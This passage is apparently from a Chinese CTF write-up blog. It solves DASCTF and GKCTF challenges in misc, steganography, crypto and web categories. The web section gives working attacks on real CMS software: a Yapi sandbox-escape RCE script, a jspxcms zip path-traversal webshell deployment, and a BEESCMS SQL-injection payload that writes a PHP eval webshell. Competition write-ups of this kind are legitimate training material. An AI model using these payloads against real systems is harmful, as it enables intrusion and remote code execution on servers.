class="built_in">print</span>(r.recvline())</span><br><span class="line">r.recvline()</span><br><span class="line"><span class="keyword">if</span> ans[i]==<span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">r.sendline(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">x=r.recvline()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;r&#x27;</span></span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;Sorry&#x27;</span> <span class="keyword">in</span> x:</span><br><span class="line">ans[i]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Play again? (y/n): &#x27;</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.sendline(ans[i])</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h3><blockquote><p>七月被困在了迷宫里，十秒后迷宫的终点就要永远消失了，你能帮她走出迷宫吗？</p><p>nc 连接</p></blockquote><p>DFS算法走迷宫。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27139</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sol</span>(<span class="params">maze</span>):</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(path) &gt; <span class="number">0</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">&#x27;&#x27;</span>.join(row) <span class="keyword">for</span> row <span class="keyword">in</span> maze))</span><br><span class="line">solution = <span class="string">&#x27;&#x27;</span>.join(path)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(solution)</span><br><span class="line"><span class="keyword">global</span> path</span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">maze, y, x</span>):</span></span><br><span class="line"><span class="keyword">if</span> maze[y][x] <span class="keyword">in</span> (<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;S&#x27;</span>):</span><br><span class="line">tag = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">if</span> dfs(maze, y, x+<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;R&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y+<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;D&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y, x-<span class="number">1</span>) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;L&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">elif</span> dfs(maze, y-<span class="number">1</span>, x) == <span class="literal">True</span>:</span><br><span class="line">tag = <span class="string">&#x27;U&#x27;</span></span><br><span class="line">path.append(tag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tag = <span class="string">&#x27; &#x27;</span></span><br><span class="line">maze[y][x] = tag</span><br><span class="line"><span class="keyword">return</span> (tag != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> maze[y][x] == <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">maze = []</span><br><span class="line"></span><br><span class="line">first = p.recvline().strip()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> first:</span><br><span class="line"><span class="built_in">print</span>(first)</span><br><span class="line"><span class="built_in">print</span>(p.recvall())</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">leng = <span class="built_in">len</span>(first)</span><br><span class="line">maze.append(<span class="built_in">list</span>(first))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(leng-<span class="number">1</span>):</span><br><span class="line">now = p.recvline().strip()</span><br><span class="line">maze.append(<span class="built_in">list</span>(now))</span><br><span class="line"></span><br><span class="line">start = []</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze)):</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(maze[y])):</span><br><span class="line"><span class="keyword">if</span> maze[y][x] == <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">start = [y,x]</span><br><span class="line"></span><br><span class="line">path = []</span><br><span class="line">dfs(maze, start[<span class="number">0</span>], start[<span class="number">1</span>])</span><br><span class="line">sol = get_sol(maze)</span><br><span class="line"><span class="built_in">print</span>(sol)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(sol)+<span class="number">1</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h3><blockquote><p>有手就行的隐写</p></blockquote><p>10M+ png图。</p><p>zsteg在G通道发现隐写另一png图，文字只有一半flag：</p><p><img src="/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/part1.png" alt="part1" style="zoom: 25%;"></p><p>查找QIM算法：</p><blockquote><p>量化索引调制算法(QIM)是一种经典的水印算法，它根据水印信息，把原始载体数据用量化器量化到不同的索引区间，能在获取较高的鲁棒性同时，具有较小嵌入失真。QIM算法能有效抵抗滤波、噪声、剪切等常见攻击。</p></blockquote><p>找到<a href="https://github.com/pl561/QuantizationIndexModulation">具体实现代码</a>，将输入从一维修改为二维图像矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Implementation of QIM method from Data Hiding Codes, Moulin and Koetter, 2005&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">HOME = os.environ[<span class="string">&quot;HOME&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">self.delta = delta</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x is a vector of values to be quantized individually</span></span><br><span class="line"><span class="string">m is a binary vector of bits to be embeded</span></span><br><span class="line"><span class="string">returns: a quantized vector y</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">d = self.delta</span><br><span class="line">y = np.<span class="built_in">round</span>(x/d) * d + (-<span class="number">1</span>)**(m+<span class="number">1</span>) * d/<span class="number">4.</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">z is the received vector, potentially modified</span></span><br><span class="line"><span class="string">returns: a detected vector z_detected and a detected message m_detected</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shape = z.shape</span><br><span class="line">z = z.flatten()</span><br><span class="line"></span><br><span class="line">m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line"></span><br><span class="line">z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d0 = np.<span class="built_in">abs</span>(z - z0)</span><br><span class="line">d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line"></span><br><span class="line">gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line"><span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line"><span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">m_detected[i] = <span class="number">0</span></span><br><span class="line">z_detected[i] = z0[i]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">m_detected[i] = <span class="number">1</span></span><br><span class="line">z_detected[i] = z1[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z_detected = z_detected.reshape(shape)</span><br><span class="line">m_detected = m_detected.reshape(shape)</span><br><span class="line"><span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_msg</span>(<span class="params">self, l</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">returns: a random binary sequence of length l</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">return</span> np.random.choice((<span class="number">0</span>, <span class="number">1</span>), l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_qim</span>():</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">tests the embed and detect methods of class QIM</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#l = 10000 # binary message length</span></span><br><span class="line">delta = <span class="number">20</span> <span class="comment"># quantization step</span></span><br><span class="line">qim = QIM(delta)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x = np.random.randint(0, 255, l).astype(float) # host sample</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg = qim.random_msg(l)</span></span><br><span class="line"><span class="comment">#y = qim.embed(x, msg)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;ezSteganography-flag.png&#x27;</span>)</span><br><span class="line">y = np.array(img)</span><br><span class="line"></span><br><span class="line">z_detected, msg_detected = qim.detect(y)</span><br><span class="line">new_img = Image.fromarray(np.uint8(<span class="number">255</span>*msg_detected))</span><br><span class="line">new_img.save(<span class="string">&#x27;part2.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(x)</span></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(z_detected)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(msg)</span></span><br><span class="line"><span class="built_in">print</span>(msg_detected)</span><br><span class="line"><span class="comment">#assert np.allclose(msg, msg_detected) # compare the original and detected messages</span></span><br><span class="line"><span class="comment">#assert np.allclose(y, z_detected) # compare the original and detected vectors</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">test_qim()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">sys.exit(main())</span><br></pre></td></tr></table></figure><p>得到隐写png水印图片：</p><p><img src="/2021/08/01/match-2021DASCTF-July-X-CBCTF-4th/part2.png" alt="part2" style="zoom: 25%;"></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><blockquote><p>你真的会 nodejs 吗？</p></blockquote><p><a href="https://www.secpulse.com/archives/162502.html">Yapi远程命令执行漏洞</a>。</p><p>注册并登录账号，添加项目，选择设置，设置全局mock脚本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString()</span><br></pre></td></tr></table></figure><p>打开脚本，添加一个接口，访问Mock地址即可成功RCE。</p><p>​    </p><h3 id="jspxcms"><a href="#jspxcms" class="headerlink" title="jspxcms"></a>jspxcms</h3><blockquote><p><a href="http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/">http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/</a></p><p>靶机每十分钟重置一次。</p></blockquote><p><a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">Jspxcms解压getshell漏洞</a>。</p><p>参考<a href="https://www.laoliang.net/jsjh/technology/6525.html">信息</a>登录后台<code>/cmscp/index.do</code>，<code>admin/空</code> 弱口令进入后台，在文件管理可上传文件。</p><p>虽然能上传任意文件，但在<code>JspDispatcherFilter.java</code>限制了对jsp文件的访问，但可上传并解压zip文件，因<code>WebFileUploadsController.java</code>里的<code>unzip</code>方法调用了下层方法却没有进行文件名检查，导致可以目录穿透。</p><p>将大马<code>cmd.war</code>打包上传并解压，默认放在<code>\webapps\ROOT\uploads\1\</code>下，再修改文件名为<code>../../../cmd.war</code>即可将<code>cmd.war</code>置于<code>webapps</code>根目录下，可自动解析。</p><p>访问<code>/cmd</code>查看根目录flag。</p><p>​    </p><h3 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h3><blockquote><p>赛博CMS，只为安全而生</p><p>Hint: 信息搜集是一个web手必备的技能</p></blockquote><p>下载源码<code>www.zip</code>，在<code>/admin/version.php</code>中发现此为BEESCMS v4.0改的CMS。</p><p>找到后台登录页面存在<a href="https://www.cnblogs.com/yuzly/p/11423384.html">Beescms_v4.0 SQL注入漏洞</a>，不同在于过滤函数除了<code>fl_value</code>和<code>fl_html</code>，还多了个<code>f1_vvv</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">&#x27;INC_BEES&#x27;</span>,<span class="string">&#x27;B&#x27;</span>.<span class="string">&#x27;EE&#x27;</span>.<span class="string">&#x27;SCMS&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fl_value</code>过滤关键字，可双写绕过；</p><p><code>f1_html</code>中<code>htmlspecialchars</code>只对双引号编码，可用单引号绕过；</p><p><code>f1_vvv</code>中过滤空格和<code>0x</code>，空格可注释绕过，<code>0x</code>双写绕过。</p><p>payload:</p><p><code>user=-1&#39;/**/uni union on/**/selselectect/**/00xx3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,2,3,4,5/**/int into o/**/outoutfilefile/**/&#39;/var/www/html/2.php&#39;%23&amp;password=ss&amp;code=&amp;submit=true&amp;submit.x=46&amp;submit.y=24</code></p><p>写入shell，蚁剑连接，根目录找到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;2021 DASCTF实战精英夏令营预热赛&lt;br&gt;DASCTF July x CBCTF 4th&lt;br&gt;主办单位: 安恒信息、杭州电子科技大学网络空间安全学院&lt;br&gt;竞赛时间: 2021年7月31日10:00- 2021年8月1日18:00&lt;br&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF x DASCTF应急挑战杯</title>
    <link href="https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/</id>
    <published>2021-06-26T09:31:36.000Z</published>
    <updated>2021-06-29T11:50:57.838Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>指导单位: 中国移动通信联合会<br>主办单位: 防灾科技学院信息工程学院杭州安恒信息技术股份有限公司<br>本次命题: Ginkgo战队<br>比赛时间: 2021年6月26日09:00-17:00<br>报名时间: 2021年6月21日19:30-6月26日9:00<br>报名地址: buuoj.cn/das</p><p>Rank: 40</p><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><blockquote><p>flag格式为 GKCTF{}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>():</span></span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">64</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">96</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file.close()</span><br><span class="line">get_mask()</span><br><span class="line">flag = md5(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></blockquote><p>Python中random模块采用梅森旋转算法（MT19937）生成伪随机序列中的元素，该PRNG采用32位的state和32位的输出，在获得足够连续输出的情况下，梅森旋转算法接下来的输出值是可以准确预测的。</p><p>根据 <code>random.txt</code> 中104组 <code>random.getrandbits()</code> 函数输出值，利用预测工具 <a href="https://github.com/kmyk/mersenne-twister-predictor">Mersenne Twister Predictor</a> 来求出下一个随机数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">c1 = []</span><br><span class="line">c2 = []</span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(file),<span class="number">3</span>):</span><br><span class="line">c1 += [<span class="built_in">int</span>(file[k].strip())]</span><br><span class="line">c2 += [<span class="built_in">int</span>(file[k+<span class="number">1</span>].strip())]</span><br><span class="line">c3 += [<span class="built_in">int</span>(file[k+<span class="number">2</span>].strip())]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">predictor.setrandbits(c1[k], <span class="number">32</span>)</span><br><span class="line">predictor.setrandbits(c2[k], <span class="number">64</span>)</span><br><span class="line">predictor.setrandbits(c3[k], <span class="number">96</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(predictor.getrandbits(<span class="number">32</span>)).encode()).hexdigest())</span><br><span class="line"><span class="comment">#14c71fec812b754b2061a35a4f6d8421</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>师傅们玩的开心~（flag由flag头包裹</p></blockquote><p>用Wireshark打开流量包文件 <code>tmpshell.pcapng</code>，追踪TCP流，从第3个流开始有HTTP POST数据包，都为 <code>/g1nkgo/tmpshell.php</code> 的RCE结果。</p><p>看到第5个流有 <code>cat /f14g</code> 命令结果，下载下来16进制查看，从文件头 <code>1f8b0800000000000003</code>  知为gzip文件，解压，逆序+base64解码得：</p><p><code>[回车] [回车] [回车] ffllaagg{{}}WWeellcc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!!</code></p><p>两个相同字符一组还原得flag。</p><p>​    </p><h3 id="问卷调查"><a href="#问卷调查" 